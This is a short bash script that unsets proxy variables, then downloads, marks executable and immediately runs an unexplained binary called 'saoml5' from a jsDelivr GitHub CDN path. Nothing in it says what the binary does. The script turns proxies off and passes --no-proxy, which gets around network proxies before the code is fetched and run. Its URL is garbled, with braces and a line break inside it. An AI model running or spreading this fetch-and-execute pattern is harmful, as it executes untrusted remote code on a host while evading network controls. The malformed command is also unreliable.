#!/bin/bash
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY
rm -rf saoml5
wget --no-proxy -O saoml5 https://cdn.jsdelivr.net/gh{qq979338111}/{SAOML2026
}@main/saoml5
chmod +x saoml5
sleep 0.3
./saoml5
